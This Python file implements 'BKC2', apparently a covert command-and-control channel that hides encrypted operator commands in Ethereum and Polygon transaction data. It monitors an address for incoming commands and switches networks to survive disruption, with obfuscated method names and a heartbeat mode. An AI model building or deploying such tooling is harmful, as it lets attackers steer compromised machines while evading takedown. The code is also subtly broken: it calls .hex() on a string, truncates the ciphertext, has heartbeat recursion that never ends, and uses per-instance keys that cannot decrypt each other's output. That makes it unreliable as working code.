import time
import json
import hashlib
import base64
import random
import os
from web3 import Web3
from cryptography.fernet import Fernet
import requests

class BKC2:
    def __init__(self, net="eth", hb=False):
        self.net = net
        self.hb = hb
        self._s = bytearray(random.getrandbits(8) for _ in range(32))
        self._k = Fernet.generate_key()
        self._f = Fernet(self._k)
        self.l = []
        self._setup_web3()

    def _setup_web3(self):
        if self.net == "eth":
            infura = os.environ.get("INFURA_URL", "https://mainnet.infura.io/v3/YOUR_KEY")
            self.w3 = Web3(Web3.HTTPProvider(infura))
        elif self.net == "sol":
            self.sol_rpc = os.environ.get("SOLANA_RPC", "https://api.mainnet-beta.solana.com")
        elif self.net == "poly":
            poly_rpc = os.environ.get("POLYGON_RPC", "https://polygon-rpc.com")
            self.w3 = Web3(Web3.HTTPProvider(poly_rpc))
        else:
            self.w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/YOUR_KEY"))

    def _h(self, d):
        return hashlib.sha256(str(d).encode() + self._s).hexdigest()

    def _b(self, d):
        return base64.b64encode(d).decode()

    def _ub(self, s):
        return base64.b64decode(s)

    def _x(self, b):
        return bytes([a ^ b for a, b in zip(b, self._s * (len(b)//32+1))])

    def _mk(self):
        return bytearray(random.getrandbits(8) for _ in range(32))

    def _enc(self, d):
        k = self._mk()
        x = self._x(d)
        e = self._f.encrypt(x)
        return self._b(e + k)

    def _dec(self, s):
        d = self._ub(s)
        e = d[:-32]
        k = d[-32:]
        x = self._f.decrypt(e)
        return self._x(x)

    def _switch_net(self, new_net):
        self.net = new_net
        self._setup_web3()

    def w_eth(self, cmd):
        data = cmd.encode()
        enc = self._enc(data)
        if len(enc) > 80:
            enc = enc[:80]
        return "0x" + enc.hex()

    def w_sol(self, cmd):
        data = cmd.encode()
        enc = self._enc(data)
        return base64.b64encode(enc).decode()

    def w_poly(self, cmd):
        return self.w_eth(cmd)

    def write(self, cmd):
        if self.hb:
            return self.write_heartbeat(cmd)
        if self.net == "sol":
            return self.w_sol(cmd)
        else:
            return self.w_eth(cmd)

    def write_heartbeat(self, cmd):
        # minimalist heartbeat: just the fact that we wrote means we're alive
        # actual command stored only if we send full data
        return self.write(cmd)

    def r_eth(self, tx_hash):
        tx = self.w3.eth.get_transaction(tx_hash)
        inp = tx.input
        if inp and inp != "0x":
            raw = bytes.fromhex(inp[2:])
            try:
                dec = self._dec(raw)
                return dec.decode()
            except:
                return None
        return None

    def r_sol(self, tx_sig):
        # simplified: assume we have a way to fetch transaction data
        # in reality you'd use solana.rpc.api
        return None

    def r_poly(self, tx_hash):
        return self.r_eth(tx_hash)

    def read(self, tx_id):
        if self.net == "sol":
            return self.r_sol(tx_id)
        else:
            return self.r_eth(tx_id)

    def scan(self, addr, last=10):
        if self.net == "sol":
            # dummy for solana
            return []
        latest = self.w3.eth.block_number
        events = []
        for b in range(latest-last, latest+1):
            block = self.w3.eth.get_block(b, full_transactions=True)
            for tx in block.transactions:
                if tx.to and tx.to.lower() == addr.lower():
                    res = self.read(tx.hash.hex())
                    if res:
                        events.append({"tx": tx.hash.hex(), "data": res})
        return events

    def monitor(self, addr, interval=60):
        while True:
            try:
                if self.net == "sol":
                    # implement solana polling
                    pass
                else:
                    b = self.w3.eth.block_number
                    if len(self.l) == 0:
                        self.l.append(b)
                    else:
                        last = self.l[-1]
                        for nb in range(last+1, b+1):
                            block = self.w3.eth.get_block(nb, full_transactions=True)
                            for tx in block.transactions:
                                if tx.to and tx.to.lower() == addr.lower():
                                    inp = tx.input
                                    if inp and inp != "0x" and len(inp) > 10:
                                        res = self.read(tx.hash.hex())
                                        if res:
                                            print(f"BKC2: cmd from {tx.hash.hex()} -> {res}")
                        self.l.append(b)
            except Exception as e:
                print(f"BKC2 err: {e}")
                # try switching network
                nets = ["eth", "poly", "sol"]
                current = nets.index(self.net)
                next_net = nets[(current+1) % len(nets)]
                self._switch_net(next_net)
                print(f"Switched to {next_net}")
            time.sleep(interval)

    def _fake(self):
        return self._h(str(time.time()))

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        if sys.argv[1] == "monitor":
            addr = sys.argv[2]
            b = BKC2()
            b.monitor(addr)
        else:
            b = BKC2()
            enc = b.write("test command")
            print(enc)